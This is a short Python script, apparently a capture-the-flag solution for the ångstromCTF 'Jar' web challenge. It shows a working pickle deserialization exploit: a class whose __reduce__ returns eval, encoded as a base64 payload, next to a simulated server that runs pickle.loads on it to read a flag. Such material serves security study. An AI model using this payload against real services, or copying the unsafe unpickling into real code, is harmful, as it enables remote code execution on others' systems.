import pickle
import base64

### Exploit ##########
# https://github.com/Hackin7/Programming-Crappy-Solutions/tree/master/Cyber%20Security/Capture%20the%20Flag%20Competitions/2021/%C3%A5ngstromCTF/Web/Jar
class Exploit():
    def __reduce__(self):
        return eval, ("[flag]", )

pickled = pickle.dumps(Exploit())
payload = base64.urlsafe_b64encode(pickled).decode()
print(payload)

### Server Side #######
flag="boilerplate{pickle_rce}"
items = pickle.loads(base64.b64decode(payload))
print(items)
